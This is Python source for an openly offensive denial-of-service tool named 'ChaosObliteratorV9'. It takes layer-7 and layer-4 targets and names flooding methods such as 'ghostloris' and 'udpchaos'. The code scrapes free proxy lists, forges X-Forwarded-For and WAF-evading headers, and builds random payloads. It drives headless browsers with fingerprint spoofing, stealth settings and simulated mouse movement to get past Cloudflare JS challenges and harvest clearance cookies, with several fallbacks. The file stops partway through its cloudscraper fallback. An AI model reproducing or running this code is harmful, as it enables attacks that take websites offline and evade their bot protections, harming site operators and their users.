import threading
import socket
import random
import string
import time
import argparse
import logging
import os
import hashlib
import xxhash
import h2.connection
import h2.events
import json
import ssl
from typing import List
from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError
import tls_client
import undetected_chromedriver as uc
import requests
from requests.cookies import RequestsCookieJar
import cloudscraper
import subprocess
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium_stealth import stealth
from bs4 import BeautifulSoup

# Logging Setup
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - [%(levelname)s] %(message)s",
    handlers=[logging.FileHandler("chaos_obliterator_v9.log"), logging.StreamHandler()]
)

class ChaosObliteratorV9:
    def __init__(self, target_l7: str = None, target_l4: str = None, duration: int = 60, threads: int = 30, methods: List[str] = None, proxy: str = None):
        self.target_l7 = target_l7.replace("https://", "").replace("http://", "").replace("www.", "").split("/")[0] if target_l7 else None
        self.target_l4 = target_l4 if target_l4 else None
        self.duration = duration
        self.threads = min(threads, 60)
        self.methods = methods if methods else ["chaoshttp", "ghostloris", "udpchaos", "tcpobliterator"]
        self.end_time = time.time() + duration
        self.user_agents = [
            f"Mozilla/5.0 (Windows NT {random.uniform(12.0, 18.0):.1f}; Win64; x64) AppleWebKit/537.{random.randint(80, 90)} (KHTML, like Gecko) Chrome/{random.randint(124, 126)}.0.0.0 Safari/537.{random.randint(80, 90)}",
            f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(16, 20)}_0 like Mac OS X) AppleWebKit/605.1.{random.randint(40, 50)} (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
            f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{random.randint(14, 15)}_{random.randint(0, 5)}) AppleWebKit/537.{random.randint(80, 90)} (KHTML, like Gecko) Chrome/{random.randint(124, 126)}.0.0.0 Safari/537.{random.randint(80, 90)}"
        ]
        self.success_count = {m: 0 for m in self.methods}
        self.response_times = {m: [] for m in ["chaoshttp", "ghostloris"]}
        self.lock = threading.Lock()
        self.active_ports = [80, 443, 53, 123, 161, 389, 445, 1433, 1900, 5060, 11211, 1812, 5353, 3478, 6881, 17185, 27015, 4433]
        self.jitter_factors = {i: 1.0 for i in range(self.threads)}
        self.cookies = RequestsCookieJar()
        self.session_headers = {}
        self.cookie_file = "cookies.json"
        self.screenshot_dir = "screenshots"
        self.proxy = proxy
        self.proxy_pool = self._get_proxy_pool()
        os.makedirs(self.screenshot_dir, exist_ok=True)
        self.retry_paths = ["/", "/home", "/about", "/contact", "/index.html"]

    def _get_proxy_pool(self) -> List[str]:
        """Fetch and validate proxy pool from multiple sources."""
        proxies = []
        sources = [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http,socks5&timeout=1000&country=all&ssl=all&anonymity=all",
            "https://www.free-proxy-list.net/",
            "https://proxylist.geonode.com/api/proxy-list?limit=50&page=1&sort_by=lastChecked&sort_type=desc"
        ]
        for source in sources:
            try:
                if "proxyscrape" in source:
                    response = requests.get(source, timeout=5)
                    proxies.extend([p for p in response.text.splitlines() if p])
                elif "free-proxy-list" in source:
                    response = requests.get(source, timeout=5)
                    soup = BeautifulSoup(response.text, 'html.parser')
                    for row in soup.select("table.table tbody tr"):
                        cols = row.find_all("td")
                        if len(cols) > 1:
                            ip, port = cols[0].text, cols[1].text
                            proxies.append(f"http://{ip}:{port}")
                elif "geonode" in source:
                    response = requests.get(source, timeout=5)
                    data = response.json()
                    for proxy in data.get("data", []):
                        ip, port = proxy["ip"], proxy["port"]
                        proxies.append(f"http://{ip}:{port}")
            except Exception as e:
                logging.warning(f"Failed to fetch proxies from {source}: {e}")
        valid_proxies = []
        for proxy in proxies[:50]:  # Limit to 50 to avoid overload
            try:
                start_time = time.time()
                test_response = requests.get("https://www.google.com", proxies={"https": proxy}, timeout=2)
                if test_response.status_code == 200 and (time.time() - start_time) * 1000 < 1000:
                    valid_proxies.append(proxy)
                    logging.info(f"Proxy {proxy} added to pool (latency: {(time.time() - start_time) * 1000:.2f}ms)")
            except:
                pass
        return valid_proxies if valid_proxies else [self.proxy] if self.proxy else [None]

    def _random_payload(self, size: int = 512) -> bytes:
        """Generate polymorphic payload."""
        seed = f"{random.randint(10000000000000000, 99999999999999999)}{time.time_ns()}{os.urandom(15).hex()}".encode()
        hash1 = xxhash.xxh3_128(seed).digest()
        hash2 = hashlib.sha3_512(hash1 + os.urandom(13)).digest()
        hash3 = xxhash.xxh64(hash2 + os.urandom(11)).digest()
        hash4 = hashlib.blake2b(hash3 + os.urandom(9), digest_size=32).digest()
        return (hash4 + hash3 + hash2 + os.urandom(1))[:size]

    def _random_path(self) -> str:
        """Generate obfuscated URL paths with fallbacks."""
        if random.random() < 0.7:
            prefixes = ["v16", "chaos", "obliterator", "nexus", "vortex"]
            segments = [''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(45, 60))) for _ in range(random.randint(12, 15))]
            query = f"?matrix={''.join(random.choices(string.hexdigits.lower(), k=52))}&epoch={random.randint(100000000000000, 999999999999999)}"
            return f"/{random.choice(prefixes)}/{'/'.join(segments)}{query}"
        return random.choice(self.retry_paths)

    def _random_ip(self) -> str:
        """Generate spoofed IP for headers."""
        return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

    def _random_headers(self) -> dict:
        """Generate WAF-evading headers."""
        headers = {
            "User-Agent": random.choice(self.user_agents),
            "X-Forwarded-For": self._random_ip(),
            "Accept": random.choice(["application/json", "text/html", "*/*", "application/x-graphql"]),
            "Cache-Control": "no-cache, no-store, must-revalidate",
            "Connection": "keep-alive",
            "Sec-Ch-Ua": f'"Google Chrome";v="{random.randint(124, 126)}", "Not;A=Brand";v="8", "Chromium";v="{random.randint(124, 126)}"',
            "Sec-Ch-Ua-Mobile": random.choice(["?0", "?1"]),
            "Sec-Ch-Ua-Platform": random.choice(['"Windows"', '"macOS"', '"Linux"'])
        }
        headers.update(self.session_headers)
        if random.random() < 0.95:
            headers["X-Entropy-Charge"] = ''.join(random.choices(string.hexdigits.lower(), k=60))
        return headers

    def _save_cookies(self, cookies, response_headers: dict = None):
        """Save cookies and headers for debugging."""
        data = {"timestamp": time.time(), "cookies": cookies}
        if response_headers:
            data["response_headers"] = dict(response_headers)
        try:
            with open(self.cookie_file, "w") as f:
                json.dump(data, f, indent=2)
            logging.info(f"Cookies saved to {self.cookie_file}")
        except Exception as e:
            logging.warning(f"Failed to save cookies: {e}")

    def _save_screenshot(self, obj, attempt: int, error_type: str):
        """Save screenshot for debugging with error type."""
        screenshot_path = os.path.join(self.screenshot_dir, f"{error_type}_attempt_{attempt}_{int(time.time())}.png")
        try:
            if hasattr(obj, 'screenshot'):
                obj.screenshot(path=screenshot_path)
            elif hasattr(obj, 'get_screenshot_as_file'):
                obj.get_screenshot_as_file(screenshot_path)
            else:
                logging.warning(f"Cannot save screenshot for {type(obj)}")
                return
            logging.info(f"Screenshot saved to {screenshot_path}")
        except Exception as e:
            logging.warning(f"Failed to save screenshot to {screenshot_path}: {e}")

    def _get_browser_session(self):
        """Use headless browser to bypass JS challenges with robust retries."""
        max_attempts = 5
        attempt = 0
        viewports = [
            {"width": random.randint(1280, 2560), "height": random.randint(720, 1440)},
            {"width": random.randint(1280, 1920), "height": random.randint(720, 1080)},
            {"width": random.randint(1366, 1920), "height": random.randint(768, 1200)}
        ]
        while attempt < max_attempts:
            proxy = random.choice(self.proxy_pool) if self.proxy_pool else None
            try:
                if os.system("command -v xvfb-run > /dev/null") == 0:
                    subprocess.run(["xvfb-run", "--auto-servernum", "python3", "-c", "import playwright"], check=True, capture_output=True)
                with sync_playwright() as p:
                    browser = p.chromium.launch(headless=True, proxy={"server": proxy} if proxy else None)
                    context = browser.new_context(
                        user_agent=random.choice(self.user_agents),
                        viewport=random.choice(viewports),
                        java_script_enabled=True,
                        ignore_https_errors=True,
                        bypass_csp=True
                    )
                    page = context.new_page()
                    page.set_default_timeout(20000)  # Reduced timeout for faster retries
                    page.set_default_navigation_timeout(20000)

                    # Log network events
                    page.on("response", lambda response: logging.debug(f"Network response: {response.url} - Status {response.status}"))
                    
                    # Inject advanced spoofing
                    page.evaluate("""
                        () => {
                            // Canvas spoofing
                            const getContext = HTMLCanvasElement.prototype.getContext;
                            HTMLCanvasElement.prototype.getContext = function(contextType, attributes) {
                                if (contextType === 'webgl' || contextType === 'webgl2') {
                                    const gl = getContext.call(this, contextType, attributes);
                                    const origGetParameter = gl.getParameter;
                                    gl.getParameter = function(parameter) {
                                        if (parameter === gl.RENDERER || parameter === gl.VENDOR) {
                                            return 'WebGL Spoofed ' + Math.random().toString(36).substring(7);
                                        }
                                        return origGetParameter.call(this, parameter);
                                    };
                                    return gl;
                                }
                                return getContext.call(this, contextType, attributes);
                            };
                            // Font spoofing
                            const fonts = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New'];
                            Object.defineProperty(window, 'FontFace', {
                                value: function() { return { family: fonts[Math.floor(Math.random() * fonts.length)] }; }
                            });
                            // Touch event spoofing
                            window.ontouchstart = () => {};
                            window.ontouchmove = () => {};
                            // Audio context spoofing
                            const origAudioContext = window.AudioContext;
                            window.AudioContext = function() {
                                const ctx = new origAudioContext();
                                ctx.sampleRate = 44100 + Math.random() * 100;
                                return ctx;
                            };
                            // Navigator spoofing
                            Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                            Object.defineProperty(navigator, 'hardwareConcurrency', {get: () => Math.floor(Math.random() * 8) + 1});
                            Object.defineProperty(navigator, 'deviceMemory', {get: () => Math.floor(Math.random() * 8) + 2});
                        }
                    """)

                    # Try different paths to bypass navigation issues
                    path = random.choice(self.retry_paths) if attempt > 0 else self._random_path()
                    url = f"https://{self.target_l7}{path}"
                    try:
                        page.goto(url, wait_until="domcontentloaded")
                    except PlaywrightTimeoutError as e:
                        logging.error(f"Attempt {attempt + 1}: Page.goto failed: {e}")
                        self._save_screenshot(page, attempt + 1, "page_goto_timeout")
                        attempt += 1
                        browser.close()
                        continue

                    time.sleep(random.uniform(1, 2))
                    
                    # Gradual scroll with random pauses
                    for _ in range(3):
                        page.evaluate("window.scrollBy(0, document.body.scrollHeight * 0.25)")
                        time.sleep(random.uniform(0.2, 0.6))
                    
                    # Simulate natural mouse movement
                    for _ in range(4):
                        x_start = random.randint(100, 800)
                        y_start = random.randint(100, 600)
                        x_end = random.randint(100, 800)
                        y_end = random.randint(100, 600)
                        x_control1 = x_start + random.randint(-50, 50)
                        y_control1 = y_start + random.randint(-50, 50)
                        x_control2 = x_end + random.randint(-50, 50)
                        y_control2 = y_end + random.randint(-50, 50)
                        steps = 20
                        for t in range(steps + 1):
                            t = t / steps
                            x = (1-t)**3 * x_start + 3*(1-t)**2 * t * x_control1 + 3*(1-t) * t**2 * x_control2 + t**3 * x_end
                            y = (1-t)**3 * y_start + 3*(1-t)**2 * t * y_control1 + 3*(1-t) * t**2 * y_control2 + t**3 * y_end
                            page.mouse.move(x, y)
                            time.sleep(random.uniform(0.01, 0.03))
                    
                    # Simulate hover with robust fallback
                    try:
                        elements = page.query_selector_all("a, button, [role='button']")
                        if elements:
                            element = random.choice(elements)
                            blocking = page.evaluate("""
                                (element) => {
                                    const rect = element.getBoundingClientRect();
                                    const topElement = document.elementFromPoint(rect.left + rect.width / 2, rect.top + rect.height / 2);
                                    return topElement !== element ? topElement.outerHTML : null;
                                }
                            """, element)
                            if blocking:
                                logging.warning(f"Attempt {attempt + 1}: Blocking element detected: {blocking[:100]}")
                                page.evaluate("element => element.dispatchEvent(new MouseEvent('mouseover'))", element)
                            else:
                                page.evaluate("element => element.scrollIntoView({block: 'center'})", element)
                                element.hover(timeout=5000)
                            time.sleep(random.uniform(0.2, 0.5))
                        else:
                            logging.warning(f"Attempt {attempt + 1}: No hoverable elements found.")
                    except Exception as e:
                        logging.error(f"Attempt {attempt + 1}: Hover failed: {e}")
                        self._save_screenshot(page, attempt + 1, "hover_timeout")
                        attempt += 1
                        browser.close()
                        continue
                    
                    # Simulate drag event
                    page.mouse.down()
                    page.mouse.move(random.randint(100, 800), random.randint(100, 600), steps=10)
                    page.mouse.up()
                    time.sleep(random.uniform(0.3, 0.7))
                    
                    # Random interactions
                    if random.random() < 0.4:
                        page.reload(wait_until="domcontentloaded", timeout=20000)
                        time.sleep(random.uniform(0.5, 1.5))
                    if random.random() < 0.3:
                        page.keyboard.press("Control+R")
                        time.sleep(random.uniform(0.2, 0.8))
                    if page.query_selector("input[type='text']"):
                        page.fill("input[type='text']", ''.join(random.choices(string.ascii_letters, k=8)))
                        time.sleep(random.uniform(0.2, 0.5))
                    
                    # Check page status
                    response = page.evaluate("() => document.readyState")
                    if response != "complete":
                        logging.warning(f"Attempt {attempt + 1}: Page not fully loaded.")
                        self._save_screenshot(page, attempt + 1, "page_not_loaded")
                        attempt += 1
                        browser.close()
                        continue
                    
                    # Check HTTP status and response body
                    status = page.evaluate("() => window.performance.getEntriesByType('navigation')[0]?.responseStatus || 0")
                    response_body = page.content()[:200]
                    if status in [403, 429]:
                        logging.warning(f"Attempt {attempt + 1}: HTTP {status} detected. Response: {response_body}")
                        self._save_screenshot(page, attempt + 1, "http_error")
                        attempt += 1
                        browser.close()
                        continue
                    
                    # Get and validate cookies
                    cookies = context.cookies()
                    cf_clearance = any(cookie["name"] == "cf_clearance" for cookie in cookies)
                    cf_bm = any(cookie["name"] == "__cf_bm" for cookie in cookies)
                    cf_chl = any(cookie["name"].startswith("cf_chl") for cookie in cookies)
                    if not (cf_clearance and cf_bm):
                        logging.warning(f"Attempt {attempt + 1}: Missing cf_clearance or __cf_bm. Response: {response_body}")
                        self._save_cookies(cookies)
                        self._save_screenshot(page, attempt + 1, "cookie_missing")
                        attempt += 1
                        browser.close()
                        continue
                    
                    # Validate cookies with test request
                    test_headers = self._random_headers()
                    test_headers["Cookie"] = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
                    try:
                        test_response = requests.get(f"https://{self.target_l7}", headers=test_headers, proxies={"https": proxy} if proxy else None, timeout=5)
                        if test_response.status_code != 200:
                            logging.warning(f"Attempt {attempt + 1}: Cookie validation failed, status {test_response.status_code}. Response: {test_response.text[:200]}")
                            self._save_cookies(cookies, test_response.headers)
                            self._save_screenshot(page, attempt + 1, "cookie_validation_failed")
                            attempt += 1
                            browser.close()
                            continue
                    except Exception as e:
                        logging.warning(f"Attempt {attempt + 1}: Cookie validation request failed: {e}")
                        attempt += 1
                        browser.close()
                        continue
                    
                    # Check cookie expiry
                    for cookie in cookies:
                        if "expires" in cookie and cookie["expires"] < time.time() + 60:
                            logging.warning(f"Attempt {attempt + 1}: Cookie {cookie['name']} expires too soon.")
                            self._save_cookies(cookies)
                            self._save_screenshot(page, attempt + 1, "cookie_expiry")
                            attempt += 1
                            browser.close()
                            continue
                    
                    # Store cookies and headers
                    for cookie in cookies:
                        self.cookies.set(cookie["name"], cookie["value"], domain=self.target_l7, path=cookie["path"])
                    self.session_headers = {
                        "Cookie": "; ".join([f"{name}={value}" for name, value in self.cookies.items()]),
                        "Sec-Fetch-Site": "same-origin",
                        "Sec-Fetch-Mode": "navigate",
                        "Sec-Fetch-Dest": "document"
                    }
                    self._save_cookies(cookies)
                    browser.close()
                    logging.info("JS challenge passed, cookies obtained.")
                    return
            except Exception as e:
                logging.error(f"Playwright failed: {e}")
                self._save_screenshot(page, attempt + 1, "playwright_error") if 'page' in locals() else None
                attempt += 1
                if attempt == max_attempts:
                    logging.warning("Switching to undetected_chromedriver fallback...")
                    self._get_browser_session_fallback()
        logging.error("Failed to get valid cookies after max attempts, trying cloudscraper...")
        self._get_browser_session_cloudscraper()

    def _get_browser_session_fallback(self):
        """Fallback to undetected_chromedriver with fixed binary location."""
        max_attempts = 5
        attempt = 0
        viewports = [
            {"width": random.randint(1280, 2560), "height": random.randint(720, 1440)},
            {"width": random.randint(1280, 1920), "height": random.randint(720, 1080)},
            {"width": random.randint(1366, 1920), "height": random.randint(768, 1200)}
        ]
        while attempt < max_attempts:
            proxy = random.choice(self.proxy_pool) if self.proxy_pool else None
            try:
                options = uc.ChromeOptions()
                options.add_argument(f"--user-agent={random.choice(self.user_agents)}")
                options.add_argument("--headless=new")
                options.add_argument("--no-sandbox")
                options.add_argument("--disable-dev-shm-usage")
                if proxy:
                    options.add_argument(f"--proxy-server={proxy}")
                # Explicitly set binary location
                options.binary_location = "/usr/bin/chromium"  # Common path, adjust if needed
                driver = uc.Chrome(options=options, headless=True, use_subprocess=False, version_main=126)
                
                # Apply stealth settings
                stealth(driver,
                    languages=["en-US", "en"],
                    vendor="Google Inc.",
                    platform=random.choice(["Win32", "MacIntel", "Linux x86_64"]),
                    webgl_vendor="Intel Inc.",
                    renderer="Intel Iris OpenGL Engine",
                    fix_hairline=True,
                    timezone=random.choice(["Asia/Jakarta", "America/New_York", "Europe/London"])
                )
                
                # Try different paths
                path = random.choice(self.retry_paths) if attempt > 0 else self._random_path()
                url = f"https://{self.target_l7}{path}"
                try:
                    driver.get(url)
                    driver.set_page_load_timeout(20)
                except Exception as e:
                    logging.error(f"Fallback attempt {attempt + 1}: Page load failed: {e}")
                    self._save_screenshot(driver, attempt + 1, "page_load_timeout_fallback")
                    attempt += 1
                    driver.quit()
                    continue
                
                time.sleep(random.uniform(1, 2))
                
                # Gradual scroll
                for _ in range(3):
                    driver.execute_script("window.scrollBy(0, document.body.scrollHeight * 0.25)")
                    time.sleep(random.uniform(0.2, 0.6))
                
                # Simulate natural mouse movement
                for _ in range(4):
                    x_start = random.randint(100, 800)
                    y_start = random.randint(100, 600)
                    x_end = random.randint(100, 800)
                    y_end = random.randint(100, 600)
                    x_control1 = x_start + random.randint(-50, 50)
                    y_control1 = y_start + random.randint(-50, 50)
                    x_control2 = x_end + random.randint(-50, 50)
                    y_control2 = y_end + random.randint(-50, 50)
                    steps = 20
                    for t in range(steps + 1):
                        t = t / steps
                        x = (1-t)**3 * x_start + 3*(1-t)**2 * t * x_control1 + 3*(1-t) * t**2 * x_control2 + t**3 * x_end
                        y = (1-t)**3 * y_start + 3*(1-t)**2 * t * y_control1 + 3*(1-t) * t**2 * y_control2 + t**3 * y_end
                        driver.execute_script(f"document.elementFromPoint({x}, {y}).dispatchEvent(new MouseEvent('mousemove', {{clientX: {x}, clientY: {y}}}))")
                        time.sleep(random.uniform(0.01, 0.03))
                
                # Simulate hover with fallback
                try:
                    elements = driver.find_elements(By.CSS_SELECTOR, "a, button, [role='button']")
                    if elements:
                        element = random.choice(elements)
                        blocking = driver.execute_script("""
                            return (element) => {
                                const rect = element.getBoundingClientRect();
                                const topElement = document.elementFromPoint(rect.left + rect.width / 2, rect.top + rect.height / 2);
                                return topElement !== element ? topElement.outerHTML : null;
                            }
                        """, element)
                        if blocking:
                            logging.warning(f"Fallback attempt {attempt + 1}: Blocking element detected: {blocking[:100]}")
                            driver.execute_script("arguments[0].dispatchEvent(new MouseEvent('mouseover'))", element)
                        else:
                            driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", element)
                            element.click()
                        time.sleep(random.uniform(0.2, 0.5))
                    else:
                        logging.warning(f"Fallback attempt {attempt + 1}: No hoverable elements found.")
                except Exception as e:
                    logging.error(f"Fallback attempt {attempt + 1}: Hover failed: {e}")
                    self._save_screenshot(driver, attempt + 1, "hover_timeout_fallback")
                    attempt += 1
                    driver.quit()
                    continue
                
                # Simulate drag event
                driver.execute_script("document.elementFromPoint(500, 300).dispatchEvent(new MouseEvent('mousedown'))")
                driver.execute_script("document.elementFromPoint(600, 400).dispatchEvent(new MouseEvent('mousemove'))")
                driver.execute_script("document.elementFromPoint(600, 400).dispatchEvent(new MouseEvent('mouseup'))")
                time.sleep(random.uniform(0.3, 0.7))
                
                # Random interactions
                if random.random() < 0.4:
                    driver.refresh()
                    time.sleep(random.uniform(0.5, 1.5))
                driver.execute_script("document.elementFromPoint(500, 300).click()")
                time.sleep(random.uniform(0.3, 1))
                
                # Simulate keyboard input
                try:
                    input_field = driver.find_element(By.CSS_SELECTOR, "input[type='text']")
                    input_field.send_keys(''.join(random.choices(string.ascii_letters, k=8)))
                    time.sleep(random.uniform(0.2, 0.5))
                except:
                    pass
                
                # Get and validate cookies
                cookies = driver.get_cookies()
                cf_clearance = any(cookie["name"] == "cf_clearance" for cookie in cookies)
                cf_bm = any(cookie["name"] == "__cf_bm" for cookie in cookies)
                cf_chl = any(cookie["name"].startswith("cf_chl") for cookie in cookies)
                if not (cf_clearance and cf_bm):
                    logging.error(f"Fallback attempt {attempt + 1}: Missing cf_clearance or __cf_bm.")
                    self._save_cookies(cookies)
                    self._save_screenshot(driver, attempt + 1, "cookie_missing_fallback")
                    attempt += 1
                    driver.quit()
                    continue
                
                # Validate cookies with test request
                test_headers = self._random_headers()
                test_headers["Cookie"] = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
                try:
                    test_response = requests.get(f"https://{self.target_l7}", headers=test_headers, proxies={"https": proxy} if proxy else None, timeout=5)
                    if test_response.status_code != 200:
                        logging.error(f"Fallback attempt {attempt + 1}: Cookie validation failed, status {test_response.status_code}. Response: {test_response.text[:200]}")
                        self._save_cookies(cookies, test_response.headers)
                        self._save_screenshot(driver, attempt + 1, "cookie_validation_failed_fallback")
                        attempt += 1
                        driver.quit()
                        continue
                except Exception as e:
                    logging.error(f"Fallback attempt {attempt + 1}: Cookie validation request failed: {e}")
                    attempt += 1
                    driver.quit()
                    continue
                
                # Check cookie expiry
                for cookie in cookies:
                    if "expires" in cookie and cookie["expires"] < time.time() + 60:
                        logging.error(f"Fallback attempt {attempt + 1}: Cookie {cookie['name']} expires too soon.")
                        self._save_cookies(cookies, test_response.headers)
                        self._save_screenshot(driver, attempt + 1, "cookie_expiry_fallback")
                        attempt += 1
                        driver.quit()
                        continue
                
                # Store cookies and headers
                for cookie in cookies:
                    self.cookies.set(cookie["name"], cookie["value"], domain=self.target_l7, path=cookie["path"])
                self.session_headers = {
                    "Cookie": "; ".join([f"{name}={value}" for name, value in self.cookies.items()]),
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-Dest": "document"
                }
                self._save_cookies(cookies, test_response.headers)
                driver.quit()
                logging.info("Fallback: JS challenge passed, cookies obtained.")
                return
            except Exception as e:
                logging.error(f"Fallback failed: {e}")
                if 'driver' in locals():
                    self._save_screenshot(driver, attempt + 1, "fallback_error")
                    driver.quit()
                attempt += 1
                if attempt == max_attempts:
                    logging.warning("Switching to selenium-stealth fallback...")
                    self._get_browser_session_selenium()
        logging.error("Fallback failed after max attempts.")

    def _get_browser_session_selenium(self):
        """Fallback using selenium-stealth with enhanced stability."""
        max_attempts = 5
        attempt = 0
        viewports = [
            {"width": random.randint(1280, 2560), "height": random.randint(720, 1440)},
            {"width": random.randint(1280, 1920), "height": random.randint(720, 1080)},
            {"width": random.randint(1366, 1920), "height": random.randint(768, 1200)}
        ]
        platforms = ["Win32", "MacIntel", "Linux x86_64"]
        timezones = ["Asia/Jakarta", "America/New_York", "Europe/London"]
        while attempt < max_attempts:
            proxy = random.choice(self.proxy_pool) if self.proxy_pool else None
            try:
                options = Options()
                options.add_argument(f"--user-agent={random.choice(self.user_agents)}")
                options.add_argument("--headless=new")
                options.add_argument("--no-sandbox")
                options.add_argument("--disable-dev-shm-usage")
                if proxy:
                    options.add_argument(f"--proxy-server={proxy}")
                options.binary_location = "/usr/bin/chromium"
                driver = uc.Chrome(options=options, headless=True, use_subprocess=False, version_main=126)
                stealth(driver,
                    languages=["en-US", "en"],
                    vendor="Google Inc.",
                    platform=random.choice(platforms),
                    webgl_vendor="Intel Inc.",
                    renderer="Intel Iris OpenGL Engine",
                    fix_hairline=True,
                    timezone=random.choice(timezones)
                )
                
                path = random.choice(self.retry_paths) if attempt > 0 else self._random_path()
                url = f"https://{self.target_l7}{path}"
                try:
                    driver.get(url)
                    driver.set_page_load_timeout(20)
                except Exception as e:
                    logging.error(f"Selenium attempt {attempt + 1}: Page load failed: {e}")
                    self._save_screenshot(driver, attempt + 1, "page_load_timeout_selenium")
                    attempt += 1
                    driver.quit()
                    continue
                
                time.sleep(random.uniform(1, 2))
                
                # Gradual scroll
                for _ in range(3):
                    driver.execute_script("window.scrollBy(0, document.body.scrollHeight * 0.25)")
                    time.sleep(random.uniform(0.2, 0.6))
                
                # Simulate natural mouse movement
                for _ in range(4):
                    x_start = random.randint(100, 800)
                    y_start = random.randint(100, 600)
                    x_end = random.randint(100, 800)
                    y_end = random.randint(100, 600)
                    x_control1 = x_start + random.randint(-50, 50)
                    y_control1 = y_start + random.randint(-50, 50)
                    x_control2 = x_end + random.randint(-50, 50)
                    y_control2 = y_end + random.randint(-50, 50)
                    steps = 20
                    for t in range(steps + 1):
                        t = t / steps
                        x = (1-t)**3 * x_start + 3*(1-t)**2 * t * x_control1 + 3*(1-t) * t**2 * x_control2 + t**3 * x_end
                        y = (1-t)**3 * y_start + 3*(1-t)**2 * t * y_control1 + 3*(1-t) * t**2 * y_control2 + t**3 * y_end
                        driver.execute_script(f"document.elementFromPoint({x}, {y}).dispatchEvent(new MouseEvent('mousemove', {{clientX: {x}, clientY: {y}}}))")
                        time.sleep(random.uniform(0.01, 0.03))
                
                # Simulate hover with fallback
                try:
                    elements = driver.find_elements(By.CSS_SELECTOR, "a, button, [role='button']")
                    if elements:
                        element = random.choice(elements)
                        blocking = driver.execute_script("""
                            return (element) => {
                                const rect = element.getBoundingClientRect();
                                const topElement = document.elementFromPoint(rect.left + rect.width / 2, rect.top + rect.height / 2);
                                return topElement !== element ? topElement.outerHTML : null;
                            }
                        """, element)
                        if blocking:
                            logging.warning(f"Selenium attempt {attempt + 1}: Blocking element detected: {blocking[:100]}")
                            driver.execute_script("arguments[0].dispatchEvent(new MouseEvent('mouseover'))", element)
                        else:
                            driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", element)
                            element.click()
                        time.sleep(random.uniform(0.2, 0.5))
                    else:
                        logging.warning(f"Selenium attempt {attempt + 1}: No hoverable elements found.")
                except Exception as e:
                    logging.error(f"Selenium attempt {attempt + 1}: Hover failed: {e}")
                    self._save_screenshot(driver, attempt + 1, "hover_timeout_selenium")
                    attempt += 1
                    driver.quit()
                    continue
                
                # Simulate drag event
                driver.execute_script("document.elementFromPoint(500, 300).dispatchEvent(new MouseEvent('mousedown'))")
                driver.execute_script("document.elementFromPoint(600, 400).dispatchEvent(new MouseEvent('mousemove'))")
                driver.execute_script("document.elementFromPoint(600, 400).dispatchEvent(new MouseEvent('mouseup'))")
                time.sleep(random.uniform(0.3, 0.7))
                
                # Random interactions
                if random.random() < 0.4:
                    driver.refresh()
                    time.sleep(random.uniform(0.5, 1.5))
                driver.execute_script("document.elementFromPoint(500, 300).click()")
                time.sleep(random.uniform(0.3, 1))
                
                # Simulate keyboard input
                try:
                    input_field = driver.find_element(By.CSS_SELECTOR, "input[type='text']")
                    input_field.send_keys(''.join(random.choices(string.ascii_letters, k=8)))
                    time.sleep(random.uniform(0.2, 0.5))
                except:
                    pass
                
                # Get and validate cookies
                cookies = driver.get_cookies()
                cf_clearance = any(cookie["name"] == "cf_clearance" for cookie in cookies)
                cf_bm = any(cookie["name"] == "__cf_bm" for cookie in cookies)
                cf_chl = any(cookie["name"].startswith("cf_chl") for cookie in cookies)
                if not (cf_clearance and cf_bm):
                    logging.error(f"Selenium attempt {attempt + 1}: Missing cf_clearance or __cf_bm.")
                    self._save_cookies(cookies)
                    self._save_screenshot(driver, attempt + 1, "cookie_missing_selenium")
                    attempt += 1
                    driver.quit()
                    continue
                
                # Validate cookies with test request
                test_headers = self._random_headers()
                test_headers["Cookie"] = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
                try:
                    test_response = requests.get(f"https://{self.target_l7}", headers=test_headers, proxies={"https": proxy} if proxy else None, timeout=5)
                    if test_response.status_code != 200:
                        logging.error(f"Selenium attempt {attempt + 1}: Cookie validation failed, status {test_response.status_code}. Response: {test_response.text[:200]}")
                        self._save_cookies(cookies, test_response.headers)
                        self._save_screenshot(driver, attempt + 1, "cookie_validation_failed_selenium")
                        attempt += 1
                        driver.quit()
                        continue
                except Exception as e:
                    logging.error(f"Selenium attempt {attempt + 1}: Cookie validation request failed: {e}")
                    attempt += 1
                    driver.quit()
                    continue
                
                # Check cookie expiry
                for cookie in cookies:
                    if "expires" in cookie and cookie["expires"] < time.time() + 60:
                        logging.error(f"Selenium attempt {attempt + 1}: Cookie {cookie['name']} expires too soon.")
                        self._save_cookies(cookies, test_response.headers)
                        self._save_screenshot(driver, attempt + 1, "cookie_expiry_selenium")
                        attempt += 1
                        driver.quit()
                        continue
                
                # Store cookies and headers
                for cookie in cookies:
                    self.cookies.set(cookie["name"], cookie["value"], domain=self.target_l7, path=cookie["path"])
                self.session_headers = {
                    "Cookie": "; ".join([f"{name}={value}" for name, value in self.cookies.items()]),
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-Dest": "document"
                }
                self._save_cookies(cookies, test_response.headers)
                driver.quit()
                logging.info("Selenium: JS challenge passed, cookies obtained.")
                return
            except Exception as e:
                logging.error(f"Selenium failed: {e}")
                if 'driver' in locals():
                    self._save_screenshot(driver, attempt + 1, "selenium_error")
                    driver.quit()
                attempt += 1
        logging.error("Selenium failed after max attempts, trying cloudscraper...")
        self._get_browser_session_cloudscraper()

    def _get_browser_session_cloudscraper(self):
        """Fallback using cloudscraper with enhanced configuration."""
        max_attempts = 5
        attempt = 0
        while attempt < max_attempts:
            proxy = random.choice(self.proxy_pool) if self.proxy_pool else None
            try:
                scraper = cloudscraper.create_scraper(
                    browser={"browser": "chrome", "platform": "windows", "mobile": False},
                    delay=10,
                    interpreter="nodejs"
                )
